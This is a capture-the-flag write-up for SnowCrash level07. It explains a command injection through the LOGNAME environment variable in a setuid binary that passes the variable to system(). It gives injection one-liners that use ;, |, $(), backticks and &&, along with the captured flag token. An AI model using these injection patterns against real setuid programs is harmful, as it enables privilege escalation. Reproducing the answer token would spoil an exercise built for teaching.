# Level07 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit LOGNAME environment variable injection in a setuid binary to retrieve the flag07 token.

## Vulnerability
Unsanitized environment variable `LOGNAME` passed to shell command execution.

## Exploitation

The setuid binary reads and uses the `LOGNAME` environment variable unsafely:

```c
asprintf(&format, "/bin/echo %s", getenv("LOGNAME"));
system(format);
```

**The Vulnerability:**
1. **Environment Variable Read**: Binary gets `LOGNAME` via `getenv()`
2. **No Sanitization**: Input not filtered or escaped
3. **Shell Execution**: String passed to `system()` which invokes `/bin/sh`
4. **Command Injection**: Shell metacharacters (`;`, `|`, `&`, `$()`) are interpreted
5. **Setuid Context**: Binary runs with flag07 privileges

### Exploit Steps

#### Step 1: Connect to level07
```bash
sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level07@localhost
```

#### Step 2: Inject Shell Command via LOGNAME Environment Variable
Set the LOGNAME variable with a shell command injection:

```bash
LOGNAME='test; getflag' ./level07
```

**Injection Breakdown:**
- `LOGNAME='test; getflag'` - Sets environment variable with semicolon separator
- Binary constructs: `/bin/echo test; getflag`
- `/bin/sh` interprets the semicolon as a command separator
- First command: `/bin/echo test` executes normally
- Second command: `getflag` executes with flag07 privileges

#### Step 3: Capture Token Output
The output shows both echo output and the flag token:
```
test
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Alternative Injection Methods

Other shell metacharacters also work for command injection:

```bash
# Using pipe operator
LOGNAME='test | getflag' ./level07

# Using command substitution
LOGNAME='test $(getflag)' ./level07

# Using backticks
LOGNAME='test `getflag`' ./level07

# Using && (AND operator)
LOGNAME='test && getflag' ./level07
```

## Security Flaws

1. **Environment Variable Injection**: LOGNAME not validated or sanitized
2. **system() Misuse**: Using system() with unsanitized user input
3. **Shell Interpretation**: String passed to shell interpreter enables metacharacter expansion
4. **Setuid Amplification**: Binary runs with flag07 privileges, amplifying impact
5. **No Input Validation**: Any shell metacharacters work for injection
6. **Trust in Environment**: Setuid programs should never trust environment variables

## Answer

- **Level07 Token**: `fiumuikeil55xe9cu4dood66h`
- **Vulnerability Type**: Environment variable command injection via system() call
- **Impact**: Arbitrary command execution as flag07 through unsanitized LOGNAME variable
